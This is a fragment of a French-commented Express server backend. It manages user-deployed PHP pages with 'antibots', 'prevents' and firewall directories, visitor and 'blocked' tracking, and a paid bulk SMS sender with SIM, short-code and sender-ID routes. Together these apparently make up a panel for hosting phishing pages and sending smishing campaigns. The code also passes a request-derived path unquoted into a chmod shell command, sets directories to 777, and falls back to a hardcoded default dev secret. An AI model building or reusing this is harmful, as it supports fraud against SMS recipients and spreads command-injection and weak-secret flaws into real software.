  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* GET /api/pages/:pageId/debug — affiche fichiers déployés pour diagnostic */
app.get('/api/pages/:pageId/debug', requireAuth, async (req, res) => {
  try {
    const user   = await db.findUserById(req.session.userId);
    const pageId = req.params.pageId;
    if (!(user?.pages ?? []).find(p => p.id === pageId)) return res.status(403).json({ error: 'Non autorisé.' });
    const pageDir = path.join(PAGES_DIR, pageId);
    const read = f => { try { return fs.readFileSync(path.join(pageDir, f), 'utf8'); } catch { return null; } };
    res.json({
      'config.php':          read('config.php'),
      'firewall_config.php': read('firewall_config.php'),
      'firewall.php':        read('firewall.php'),
      'common/includes.php': read('common/includes.php'),
    });
  } catch { res.status(500).json({ error: 'Erreur.' }); }
});

/* ═══════════════════════════════════════════════════════════════
   ADMIN API
   ═══════════════════════════════════════════════════════════════ */

/* GET /api/admin/users — liste tous les utilisateurs */
/* POST /api/track/:pageId — public, no auth (called by PHP pages) */
app.post('/api/track/:pageId', trackLimiter, (req, res) => {
  res.status(204).end();
  const { pageId } = req.params;
  const body       = req.body || {};
  const event      = body.e || '';
  const ua         = body.ua || '';
  // IP from socket only — never trust body.ip (attacker-controlled)
  const clientIp   = req.ip || '';

  if (!pageStats.has(pageId)) pageStats.set(pageId, emptyStats());
  const s = pageStats.get(pageId);

  switch (event) {
    case 'view':
      s.views++;
      s.visitors.add(clientIp);
      s.hourly.set(hourKey(), (s.hourly.get(hourKey()) || 0) + 1);
      if (isMobileUA(ua)) s.devices.mobile++; else s.devices.desktop++;
      break;
    case 'click':   s.clicks++;  break;
    case 'blocked':
      if (!s.blockedIps.has(clientIp)) { s.blockedIps.add(clientIp); s.blocked++; }
      break;
    case 'hb':
      if (!liveVisitors.has(pageId)) liveVisitors.set(pageId, new Map());
      liveVisitors.get(pageId).set(clientIp, Date.now());
      break;
  }
});

/* GET /api/pages/:pageId/stats */
app.get('/api/pages/:pageId/stats', requireAuth, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    const page = (user?.pages ?? []).find(p => p.id === req.params.pageId);
    if (!page) return res.status(404).json({ error: 'Page introuvable.' });

    const s    = pageStats.get(req.params.pageId) || emptyStats();
    const live = liveVisitors.get(req.params.pageId)?.size || 0;

    // build 24-slot array for last 24 hours
    const now    = Date.now();
    const hourly = [];
    for (let i = 23; i >= 0; i--) {
      const k = Math.floor((now - i * 3_600_000) / 3_600_000) * 3_600_000;
      hourly.push(s.hourly.get(k) || 0);
    }

    const total     = s.views + s.blocked;
    const blockRate = total > 0 ? ((s.blocked / total) * 100).toFixed(1) : null;

    res.json({
      views: s.views, visitors: s.visitors.size, clicks: s.clicks, blocked: s.blocked, live,
      hourly, devices: s.devices, blockRate,
    });
  } catch {
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

app.get('/api/admin/users', requireAuth, requireAdmin, adminLimiter, async (req, res) => {
  try {
    const users = await db.getAllUsers();
    res.json(users);
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* POST /api/admin/users — créer un utilisateur */
app.post('/api/admin/users', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const { username, password, role, balance } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'username et password requis.' });
    if (!/^[a-zA-Z0-9_-]{3,20}$/.test(username))
      return res.status(400).json({ error: 'Nom d\'utilisateur invalide (3-20 chars, lettres/chiffres/-_).' });
    const existing = await db.findUserByUsername(username);
    if (existing) return res.status(409).json({ error: 'Nom d\'utilisateur déjà utilisé.' });
    const passwordHash = await bcrypt.hash(password, config.security.bcryptRounds);
    const user = await db.createUser({ username, passwordHash, role: role === 'admin' ? 'admin' : 'user' });
    if (balance && !isNaN(parseFloat(balance))) {
      const initBal = parseFloat(parseFloat(balance).toFixed(2));
      const tx = makeTx({ type: 'credit', amount: initBal, label: 'Solde initial (admin)', by: 'admin' });
      await db.updateUser(user.id, { balance: initBal, transactions: [tx] });
    }
    const { passwordHash: _, ...safe } = await db.findUserById(user.id);
    res.json({ success: true, user: safe });
  } catch (err) {
    console.error('[admin/users/create]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* PATCH /api/admin/users/:id — modifier balance, role, plan */
app.patch('/api/admin/users/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const { balance, role, plan, planExpiresAt } = req.body;
    const user = await db.findUserById(req.params.id);
    if (!user) return res.status(404).json({ error: 'Utilisateur introuvable.' });

    const updates = {};
    const newTxs  = Array.isArray(user.transactions) ? [...user.transactions] : [];

    // Balance absolue — enregistrer la différence
    if (balance !== undefined && !isNaN(parseFloat(balance))) {
      const newBal = parseFloat(parseFloat(balance).toFixed(2));
      const diff   = parseFloat((newBal - (user.balance ?? 0)).toFixed(2));
      updates.balance = newBal;
      if (diff !== 0) {
        newTxs.push(makeTx({
          type:   diff > 0 ? 'credit' : 'debit',
          amount: diff,
          label:  diff > 0 ? `Crédit ajouté par admin` : `Débit par admin`,
          by:     'admin',
        }));
      }
    }

    if (role === 'admin' || role === 'user') updates.role = role;

    // Plan — set planStartedAt si nouveau plan assigné
    if (plan !== undefined) {
      const newPlan = plan || null;
      if (newPlan && newPlan !== user.plan) {
        const now = new Date();
        updates.planStartedAt = now.toISOString();
        const planCfg = config.plans[newPlan];
        newTxs.push(makeTx({
          type:   'plan_assign',
          amount: 0,
          label:  `Plan ${planCfg?.name || newPlan} assigné par admin`,
          by:     'admin',
        }));
      }
      updates.plan = newPlan;
      if (!newPlan) { updates.planStartedAt = null; updates.planExpiresAt = null; }
    }
    if (planExpiresAt !== undefined && updates.plan !== null) {
      updates.planExpiresAt = planExpiresAt || null;
    }

    updates.transactions = newTxs.slice(-200);
    await db.updateUser(req.params.id, updates);
    res.json({ success: true });
  } catch (err) {
    console.error('[admin/users/patch]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* POST /api/admin/users/:id/credit — ajouter/soustraire montant (additif) */
app.post('/api/admin/users/:id/credit', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const { amount, label } = req.body;
    const delta = parseFloat(amount);
    if (isNaN(delta) || delta === 0) return res.status(400).json({ error: 'Montant invalide.' });
    const user = await db.findUserById(req.params.id);
    if (!user) return res.status(404).json({ error: 'Utilisateur introuvable.' });
    const newBalance = parseFloat(((user.balance ?? 0) + delta).toFixed(2));
    if (newBalance < 0) return res.status(400).json({ error: 'Solde résultant négatif.' });
    const tx = makeTx({
      type:   delta > 0 ? 'credit' : 'debit',
      amount: delta,
      label:  label || (delta > 0 ? `Crédit ajouté par admin` : `Débit par admin`),
      by:     'admin',
    });
    await db.updateUser(req.params.id, {
      balance:      newBalance,
      transactions: pushTx(user, tx),
    });
    res.json({ success: true, balance: newBalance });
  } catch (err) {
    console.error('[admin/credit]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* DELETE /api/admin/users/:id — supprimer un utilisateur */
app.delete('/api/admin/users/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    if (req.params.id === req.session.userId)
      return res.status(400).json({ error: 'Vous ne pouvez pas supprimer votre propre compte.' });
    await db.deleteUser(req.params.id);
    res.json({ success: true });
  } catch (err) {
    console.error('[admin/users/delete]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* POST /api/admin/pages/:pageId/fix-perms — réparer les permissions d'une page */
app.post('/api/admin/pages/:pageId/fix-perms', requireAuth, requireAdmin, adminLimiter, async (req, res) => {
  try {
    const pageDir = path.join(PAGES_DIR, req.params.pageId);
    if (!pageDir.startsWith(PAGES_DIR) || !fs.existsSync(pageDir))
      return res.status(404).json({ error: 'Page introuvable.' });

    const writableDirs  = ['logs','cache','func','panel/logs','panel/func','Panel/func','prevents','antibots'];
    const fixed = [];

    exec(`chmod -R 750 ${pageDir}`, () => {
      for (const d of writableDirs) {
        const full = path.join(pageDir, d);
        if (fs.existsSync(full)) { exec(`chmod -R 777 ${full}`); fixed.push(d); }
      }
      console.log(`[fix-perms] ✓ ${req.params.pageId} → ${fixed.join(', ')}`);
    });

    res.json({ success: true, pageId: req.params.pageId });
  } catch (err) {
    console.error('[fix-perms]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* ── Route /admin — protégée admin ───────────────────────────── */
app.get('/admin', requireAuth, async (req, res, next) => {
  try {
    const user = await db.findUserById(req.session.userId);
    if (!user || user.role !== 'admin') return res.redirect('/dashboard');
    next();
  } catch { res.redirect('/dashboard'); }
}, (req, res) => {
  const filepath = path.resolve(ROOT, 'admin.html');
  if (!fs.existsSync(filepath)) return res.redirect('/dashboard');
  res.sendFile(filepath);
});

/* GET /sender-sms — Page Sender SMS complète */
app.get('/sender-sms', requireAuth, (req, res) => {
  const filepath = path.resolve(ROOT, 'sender-sms.html');
  if (!fs.existsSync(filepath)) return res.redirect('/sender');
  res.sendFile(filepath);
});

/* ── Pages protégées (après toutes les routes API) ───────────── */
app.get('/:page', requireAuth, (req, res) => {
  const filename = PAGE_MAP[req.params.page];
  if (!filename) return res.redirect('/dashboard');
  if (req.params.page === 'admin') return res.redirect('/admin');
  const filepath = path.resolve(ROOT, filename);
  if (!filepath.startsWith(ROOT) || !fs.existsSync(filepath)) return res.redirect('/dashboard');
  res.sendFile(filepath);
});

/* ═══════════════════════════════════════════════════════════════
   VALIDATION MOT DE PASSE
   ═══════════════════════════════════════════════════════════════ */
function validatePassword(password) {
  const s = config.security;
  if (password.length < s.passwordMinLength)
    return `Le mot de passe doit contenir au moins ${s.passwordMinLength} caractères.`;
  if (s.passwordRequireUppercase && !/[A-Z]/.test(password))
    return 'Le mot de passe doit contenir au moins une majuscule.';
  if (s.passwordRequireNumber && !/[0-9]/.test(password))
    return 'Le mot de passe doit contenir au moins un chiffre.';
  if (s.passwordRequireSpecial && !/[!@#$%^&*()\-_=+\[\]{};:'"\\|,.<>/?`~]/.test(password))
    return 'Le mot de passe doit contenir au moins un caractère spécial.';
  return null;
}

/* ═══════════════════════════════════════════════════════════════
   FICHIERS STATIQUES (CSS, JS, images uniquement)
   express.static ne sert JAMAIS les .html — interceptés plus haut
   ═══════════════════════════════════════════════════════════════ */
app.use((req, res, next) => {
  const blocked = ['/data/', '/config.js', '/server.js', '/package.json', '/node_modules/'];
  if (blocked.some(p => req.path.startsWith(p))) return res.status(404).end();
  next();
});
/* ═══════════════════════════════════════════════════════════════
   SENDER SMS
   ═══════════════════════════════════════════════════════════════ */

function requireSenderAccess(user) {
  const active = user?.plan && (!user.planExpiresAt || new Date(user.planExpiresAt) > new Date());
  return active && ['max', 'business'].includes(user.plan);
}

function serializeCampaign(c) {
  const recipients = Array.isArray(c.recipients) ? c.recipients : [];
  const pending = recipients.filter(r => r.status === 'pending').length;
  const unitCost = Number.isFinite(Number(c.costPerSms)) ? Number(c.costPerSms) : (config.sms.costPerSms || 1);
  const totalNumbers = c.totalNumbers || recipients.length;
  return {
    id: c.id,
    userId: c.userId,
    name: c.name,
    message: c.message,
    variables: c.variables || [],
    totalNumbers,
    sentCount: c.sentCount || 0,
    failedCount: c.failedCount || 0,
    pendingCount: pending,
    speed: c.speed || 1,
    status: c.status || 'pending',
    scheduledFor: c.scheduledFor || null,
    startedAt: c.startedAt || null,
    completedAt: c.completedAt || null,
    createdAt: c.createdAt,
    updatedAt: c.updatedAt,
    lastPhone: c.lastPhone || null,
    costPerSms: unitCost,
    cost: Number((unitCost * totalNumbers).toFixed(2)),
  };
}

function assertCampaignOwner(req, campaign) {
  return campaign && (campaign.userId === req.session.userId);
}

/* ── Admin SMS providers ───────────────────────────────────── */
app.get('/api/admin/sms/providers', requireAuth, requireAdmin, adminLimiter, (_req, res) => {
  res.json(smsRuntime.providerManager.list());
});

app.get('/api/admin/sms/providers/:country', requireAuth, requireAdmin, adminLimiter, (req, res) => {
  res.json(smsRuntime.providerManager.listByCountry(req.params.country));
});

app.get('/api/sender/sms/services/:country', requireAuth, async (req, res) => {
  try {
    const country = req.params.country || 'default';
    const providers = smsRuntime.providerManager.listActiveByCountry(country);
    const labels = { sim: 'Route SIM', shortcode: 'Short code', sid: 'SID', auto: 'Auto (meilleur)' };
    const servicesMap = {};
    providers.forEach(p => {
      const routeTypes = Array.isArray(p.routeTypes) && p.routeTypes.length ? p.routeTypes : p.routeType ? [p.routeType] : ['auto'];
      const price = Number.isFinite(Number(p.price)) ? Number(p.price) : null;
      routeTypes.forEach(routeType => {
        const key = String(routeType || 'auto').toLowerCase();
        if (!servicesMap[key]) {
          servicesMap[key] = {
            routeType: key,
            display: labels[key] || labels.auto,
            available: true,
            price: price,
            providers: 0,
          };
        }
        servicesMap[key].providers += 1;
        if (price !== null && (servicesMap[key].price === null || price < servicesMap[key].price)) {
          servicesMap[key].price = price;
        }
      });
    });
    const services = Object.values(servicesMap).sort((a, b) => {
      const order = ['auto', 'sim', 'shortcode', 'sid'];
      return order.indexOf(a.routeType) - order.indexOf(b.routeType);
    });
    res.json({ services });
  } catch (err) {
    res.status(500).json({ error: err.message || 'Erreur récupération services' });
  }
});

app.post('/api/admin/sms/providers', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try { res.json({ success: true, provider: await smsRuntime.providerManager.create(req.body || {}) }); }
  catch (err) { res.status(400).json({ error: err.message }); }
});

app.patch('/api/admin/sms/providers/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try { res.json({ success: true, provider: await smsRuntime.providerManager.update(req.params.id, req.body || {}) }); }
  catch (err) { res.status(400).json({ error: err.message }); }
});

app.delete('/api/admin/sms/providers/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try { await smsRuntime.providerManager.delete(req.params.id); res.json({ success: true }); }
  catch (err) { res.status(400).json({ error: err.message }); }
});

app.post('/api/admin/sms/providers/:id/test', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try { res.json({ success: true, result: await smsRuntime.providerManager.test(req.params.id) }); }
  catch (err) { res.status(400).json({ error: err.message }); }
});

app.get('/api/admin/sms/stats', requireAuth, requireAdmin, adminLimiter, (_req, res) => {
  res.json(smsRuntime.providerManager.stats());
});

// Dev-only endpoint: send a test SMS without auth (local testing only)
app.post('/__dev/send-sms', async (req, res) => {
  try {
    const secret = process.env.DEV_SMS_SECRET || 'localdevsecret';
    const given = String(req.headers['x-dev-secret'] || '').trim();
    if (!given || given !== secret) return res.status(403).json({ error: 'Forbidden' });
    const { to, message, simulate } = req.body || {};
    if (!to || !message) return res.status(400).json({ error: 'to and message required' });

    if (simulate === true || String(req.query.simulate || '').trim() === '1') {
      // Simulate send: add a log entry and return success without calling external provider
      await smsRuntime.storage.addLog({ providerId: 'simulated', campaignId: null, phone: String(to), status: 'success', durationMs: 0, error: null, routeType: 'simulated' });
      return res.json({ success: true, simulated: true });
    }

    // Attempt real send but guard with a timeout to avoid long hangs if provider is unreachable
    const sendPromise = smsRuntime.providerManager.sendSms({ phone: String(to), message: String(message) });
    const timeoutMs = 15000;
    const result = await Promise.race([
      sendPromise,
      new Promise((_, rej) => setTimeout(() => rej(new Error('Timeout sending SMS')), timeoutMs)),
    ]);
    res.json({ success: true, result });
  } catch (err) {
    console.error('[dev/send-sms]', err);
    res.status(500).json({ error: err.message || 'Erreur envoi SMS' });
  }
});

/* ── Routes SMS assignées par client ───────────────────────── */
app.get('/api/admin/sms/clients/:userId/routes', requireAuth, requireAdmin, adminLimiter, async (req, res) => {
  const user = await db.findUserById(req.params.userId);
  if (!user) return res.status(404).json({ error: 'Utilisateur introuvable.' });
  const stats = smsRuntime.storage.stats();
  const routes = Array.isArray(user.smsRoutes) ? user.smsRoutes : [];
  res.json({
    userId: user.id,
    mode: user.smsRouteMode || 'auto',
    routes: routes.map(r => ({ ...r, stats: stats.byProvider?.[r.providerId] || { total: 0, success: 0, failed: 0 } })),
  });
});

app.post('/api/admin/sms/clients/:userId/routes', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  const user = await db.findUserById(req.params.userId);
  if (!user) return res.status(404).json({ error: 'Utilisateur introuvable.' });
  const mode = ['auto', 'force', 'round_robin'].includes(req.body.mode) ? req.body.mode : 'auto';
  const routes = Array.isArray(req.body.routes) ? req.body.routes : [];
  const normalized = routes
    .filter(r => r && r.providerId)
    .map((r, idx) => ({
      providerId: String(r.providerId),
      priority: Number.isFinite(Number(r.priority)) ? Number(r.priority) : idx + 1,
      forced: !!r.forced,
      fallback: r.fallback !== false,
      active: r.active !== false,
    }))
    .sort((a, b) => a.priority - b.priority);
  await db.updateUser(user.id, { smsRouteMode: mode, smsRoutes: normalized });
  res.json({ success: true, userId: user.id, mode, routes: normalized });
});

app.delete('/api/admin/sms/clients/:userId/routes/:providerId', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  const user = await db.findUserById(req.params.userId);
  if (!user) return res.status(404).json({ error: 'Utilisateur introuvable.' });
  const routes = (Array.isArray(user.smsRoutes) ? user.smsRoutes : []).filter(r => r.providerId !== req.params.providerId);
  await db.updateUser(user.id, { smsRoutes: routes });
  res.json({ success: true });
});

app.post('/api/admin/sms/assign-route', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  const { clientId, routes, mode } = req.body || {};
  if (!clientId) return res.status(400).json({ error: 'clientId requis.' });
  req.params.userId = clientId;
  req.body = { routes, mode };
  const user = await db.findUserById(clientId);
  if (!user) return res.status(404).json({ error: 'Utilisateur introuvable.' });
  const routeList = Array.isArray(routes) ? routes : [];
  const normalized = routeList
    .filter(r => r && r.providerId)
    .map((r, idx) => ({
      providerId: String(r.providerId),
      priority: Number.isFinite(Number(r.priority)) ? Number(r.priority) : idx + 1,
      forced: !!r.forced,
      fallback: r.fallback !== false,
      active: r.active !== false,
    }))
    .sort((a, b) => a.priority - b.priority);
  await db.updateUser(user.id, { smsRouteMode: ['auto', 'force', 'round_robin'].includes(mode) ? mode : 'auto', smsRoutes: normalized });
  res.json({ success: true, userId: user.id, mode: ['auto', 'force', 'round_robin'].includes(mode) ? mode : 'auto', routes: normalized });
});

/* ── Import / validation / preview ─────────────────────────── */
app.post('/api/sender/upload', requireAuth, validateCsrf, (req, res) => {
  try {
    const { filename = 'contacts.txt', content = '', defaultDial = '+33' } = req.body || {};
    const result = smsRuntime.parser.parseFileContent(filename, content, { defaultDial });
    res.json({ success: true, ...result });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/sender/sms/upload', requireAuth, validateCsrf, (req, res) => {
  try {
    const { filename = 'contacts.txt', content = '', defaultDial = '+33' } = req.body || {};
    const result = smsRuntime.parser.parseFileContent(filename, content, { defaultDial });
    res.json({ success: true, ...result });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/sender/validate', requireAuth, validateCsrf, (req, res) => {
  try {
    const { text = '', contacts = null, defaultDial = '+33' } = req.body || {};
    if (Array.isArray(contacts)) {
      const rows = contacts.map(c => [c.phone || c.phoneRaw || '', c.first || '', c.last || '', c.company || '', c.city || '', c.zip || '', c.email || '']);
      rows.unshift(['phone', 'first', 'last', 'company', 'city', 'zip', 'email']);
      return res.json({ success: true, ...smsRuntime.parser.parseRows(rows, { defaultDial }) });
    }
    res.json({ success: true, ...smsRuntime.parser.parseText(text, { defaultDial }) });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

app.post('/api/sender/preview', requireAuth, validateCsrf, (req, res) => {
  try {
    const { message = '', contact = {}, limit = 5 } = req.body || {};
    const contacts = Array.isArray(contact) ? contact.slice(0, limit) : [contact];
    res.json({
      success: true,
      variables: smsRuntime.engine.detectVariables(message),
      previews: contacts.map(c => smsRuntime.engine.render(message, c)),
    });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

/* ── Templates sender utilisateur ───────────────────────────── */
app.get('/api/sender/templates', requireAuth, (req, res) => {
  res.json({ templates: smsRuntime.storage.listTemplates(req.session.userId) });
});
app.get('/api/sender/sms/templates', requireAuth, (req, res) => {
  res.json({ templates: smsRuntime.storage.listTemplates(req.session.userId) });
});

app.post('/api/sender/templates', requireAuth, validateCsrf, async (req, res) => {
  const { name, content } = req.body || {};
  if (!name || !content) return res.status(400).json({ error: 'name et content requis.' });
  const tpl = await smsRuntime.storage.upsertTemplate({
    userId: req.session.userId,
    name: String(name).trim(),
    content: String(content),
    variables: smsRuntime.engine.detectVariables(content),
  });
  res.json({ success: true, template: tpl });
});
app.post('/api/sender/sms/templates', requireAuth, validateCsrf, async (req, res) => {
  const { name, content } = req.body || {};
  if (!name || !content) return res.status(400).json({ error: 'name et content requis.' });
  const tpl = await smsRuntime.storage.upsertTemplate({
    userId: req.session.userId,
    name: String(name).trim(),
    content: String(content),
    variables: smsRuntime.engine.detectVariables(content),
  });
  res.json({ success: true, template: tpl });
});

app.put('/api/sender/templates/:id', requireAuth, validateCsrf, async (req, res) => {
  const current = smsRuntime.storage.listTemplates(req.session.userId).find(t => t.id === req.params.id);
  if (!current) return res.status(404).json({ error: 'Template introuvable.' });
  const content = req.body.content ?? current.content;
  const tpl = await smsRuntime.storage.upsertTemplate({
    ...current,
    ...req.body,
    userId: req.session.userId,
    id: req.params.id,
    variables: smsRuntime.engine.detectVariables(content),
  });
  res.json({ success: true, template: tpl });
});
app.put('/api/sender/sms/templates/:id', requireAuth, validateCsrf, async (req, res) => {
  const current = smsRuntime.storage.listTemplates(req.session.userId).find(t => t.id === req.params.id);
  if (!current) return res.status(404).json({ error: 'Template introuvable.' });
  const content = req.body.content ?? current.content;
  const tpl = await smsRuntime.storage.upsertTemplate({
    ...current,
    ...req.body,
    userId: req.session.userId,
    id: req.params.id,
    variables: smsRuntime.engine.detectVariables(content),
  });
  res.json({ success: true, template: tpl });
});

app.delete('/api/sender/templates/:id', requireAuth, validateCsrf, async (req, res) => {
  await smsRuntime.storage.deleteTemplate(req.session.userId, req.params.id);
  res.json({ success: true });
});
app.delete('/api/sender/sms/templates/:id', requireAuth, validateCsrf, async (req, res) => {
  await smsRuntime.storage.deleteTemplate(req.session.userId, req.params.id);
  res.json({ success: true });
});

/* ── Templates SMS globaux admin ───────────────────────────── */
app.get('/api/admin/sms/templates', requireAuth, requireAdmin, adminLimiter, (_req, res) => {
  const all = smsRuntime.storage._read().templates || [];
  res.json({ templates: all.filter(t => t.scope === 'global') });
});

app.post('/api/admin/sms/templates', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  const { name, content } = req.body || {};
  if (!name || !content) return res.status(400).json({ error: 'name et content requis.' });
  const tpl = await smsRuntime.storage.upsertTemplate({
    userId: 'admin_global',
    scope: 'global',
    name: String(name).trim(),
    content: String(content),
    variables: smsRuntime.engine.detectVariables(content),
    createdBy: req.session.userId,
  });
  res.json({ success: true, template: tpl });
});

app.put('/api/admin/sms/templates/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  const all = smsRuntime.storage._read().templates || [];
  const current = all.find(t => t.id === req.params.id && t.scope === 'global');
  if (!current) return res.status(404).json({ error: 'Template global introuvable.' });
  const content = req.body.content ?? current.content;
  const tpl = await smsRuntime.storage.upsertTemplate({
    ...current,
    ...req.body,
    id: req.params.id,
    scope: 'global',
    userId: 'admin_global',
    variables: smsRuntime.engine.detectVariables(content),
  });
  res.json({ success: true, template: tpl });
});

app.delete('/api/admin/sms/templates/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  await smsRuntime.storage.deleteTemplate('admin_global', req.params.id);
  res.json({ success: true });
});

/* ── Campagnes sender utilisateur ───────────────────────────── */
app.get('/api/sender/campaigns', requireAuth, (req, res) => {
  const campaigns = smsRuntime.storage.listCampaigns(req.session.userId)
    .sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0))
    .map(serializeCampaign);
  res.json({ campaigns });
});

app.get('/api/sender/campaigns/:id', requireAuth, (req, res) => {
  const c = smsRuntime.storage.getCampaign(req.params.id);
  if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
  res.json({ campaign: serializeCampaign(c), recipients: (c.recipients || []).slice(0, 500) });
});

app.post('/api/sender/campaigns', requireAuth, smsApiLimiter, validateCsrf, security.validators.createSMSCampaign, security.handleValidationErrors, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    if (!user) return res.status(401).json({ error: 'Session invalide.' });
    if (!requireSenderAccess(user)) return res.status(403).json({ error: 'Plan Max actif requis pour Sender SMS.' });

    const { name, message, contacts, text, defaultDial = '+33', speed = 1, scheduledFor = null, senderId = '', providerType = 'auto', routeType = 'auto' } = req.body || {};

    let parsed;
    if (Array.isArray(contacts) && contacts.length) {
      const rows = contacts.map(c => [
        c.phone || c.phoneRaw || '',
        c.first || c.first_name || c.variables?.first || '',
        c.last || c.last_name || c.variables?.last || '',
        c.company || c.variables?.company || '',
        c.city || c.variables?.city || '',
        c.zip || c.variables?.zip || '',
        c.email || c.variables?.email || '',
      ]);
      rows.unshift(['phone', 'first', 'last', 'company', 'city', 'zip', 'email']);
      parsed = smsRuntime.parser.parseRows(rows, { defaultDial });
    } else {
      parsed = smsRuntime.parser.parseText(text || '', { defaultDial });
    }
    if (!parsed.contacts.length) return res.status(400).json({ error: 'Aucun numéro valide.', details: parsed });

    const unitCost = Number.isFinite(Number(req.body.costPerSms)) ? Number(req.body.costPerSms) : (config.sms.costPerSms || 1);
    const running = smsRuntime.storage.listCampaigns(req.session.userId).filter(c => c.status === 'running').length;
    if (running >= (config.sms.maxCampaignsRunningPerUser || 10)) {
      return res.status(429).json({ error: 'Trop de campagnes simultanées.' });
    }

    const cost = parsed.contacts.length * unitCost;
    if ((user.balance ?? 0) < cost) {
      return res.status(402).json({
        error: 'Crédits insuffisants.',
        cost,
        balance: user.balance ?? 0,
        needed: parseFloat((cost - (user.balance ?? 0)).toFixed(2)),
      });
    }

    const campaign = smsRuntime.sender.createCampaign({
      userId: user.id,
      name,
      message: security.sanitizeContent(message),
      recipients: parsed.contacts,
      speed,
      scheduledFor,
    });
    const _startedCampaign = await smsRuntime.sender.startCampaign(campaign.id, {
      debit: async (count) => {
        const c = smsRuntime.storage.getCampaign(campaign.id);
        const unitCost = (campaign?.costPerSms ?? config.sms.costPerSms) || 1;
        const cost = count * unitCost;
        await db.atomicUpdate(req.session.userId, (user) => {
          if ((user.balance ?? 0) < cost) {
            const err = new Error('Crédits insuffisants.');
            err.status = 402;
            throw err;
          }
          const tx = makeTx({
            type: 'sms_send',
            amount: -cost,
            label: `Campagne SMS (${count} SMS)`,
            by: 'user',
          });
          return {
            balance: parseFloat(((user.balance ?? 0) - cost).toFixed(2)),
            transactions: pushTx(user, tx),
          };
        });
      },
    });

    const startedUser = await db.findUserById(req.session.userId);
    const upd = (Array.isArray(startedUser.smsCampaigns) ? startedUser.smsCampaigns : []).map(c => c.id === _startedCampaign.id ? serializeCampaign(_startedCampaign) : c);
    await db.updateUser(startedUser.id, { smsCampaigns: upd });

    res.json({ success: true, campaign: serializeCampaign(_startedCampaign) });
  } catch (err) {
    res.status(err.status || 500).json({ error: err.message || 'Erreur serveur.' });
  }
});

app.post('/api/sender/campaigns/:id/pause', requireAuth, validateCsrf, async (req, res) => {
  try {
    const c = smsRuntime.storage.getCampaign(req.params.id);
    if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
    const campaign = await smsRuntime.sender.pauseCampaign(req.params.id);
    res.json({ success: true, campaign: serializeCampaign(campaign) });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/sender/campaigns/:id/resume', requireAuth, validateCsrf, async (req, res) => {
  try {
    const c = smsRuntime.storage.getCampaign(req.params.id);
    if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
    const campaign = await smsRuntime.sender.resumeCampaign(req.params.id);
    res.json({ success: true, campaign: serializeCampaign(campaign) });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/sender/campaigns/:id/stop', requireAuth, validateCsrf, async (req, res) => {
  try {
    const c = smsRuntime.storage.getCampaign(req.params.id);
    if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
    const campaign = await smsRuntime.sender.stopCampaign(req.params.id);
    res.json({ success: true, campaign: serializeCampaign(campaign) });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/sender/campaigns/:id/status', requireAuth, (req, res) => {
  const c = smsRuntime.storage.getCampaign(req.params.id);
  if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
  res.json({ campaign: serializeCampaign(c) });
});

app.get('/api/sender/campaigns/:id/logs', requireAuth, (req, res) => {
  const c = smsRuntime.storage.getCampaign(req.params.id);
  if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
  const logs = smsRuntime.storage.listLogs({ campaignId: req.params.id });
  if (req.query.format === 'csv') {
    const csv = ['createdAt,providerId,phone,status,durationMs,error', ...logs.map(l => [l.createdAt,l.providerId,l.phone,l.status,l.durationMs,JSON.stringify(l.error||'')].join(','))].join('\n');
    res.type('text/csv').send(csv);
  } else {
    res.json({ logs });
  }
});

app.get('/api/sender/stats', requireAuth, async (req, res) => {
  const campaigns = smsRuntime.storage.listCampaigns(req.session.userId);
  const sent = campaigns.reduce((n, c) => n + (c.sentCount || 0), 0);
  const failed = campaigns.reduce((n, c) => n + (c.failedCount || 0), 0);
  const user = await db.findUserById(req.session.userId);
  res.json({
    balance: user?.balance ?? 0,
    campaigns: campaigns.length,
    sent,
    failed,
    providers: smsRuntime.providerManager.list().length,
    costPerSms: config.sms?.costPerSms ?? 1,
  });
});

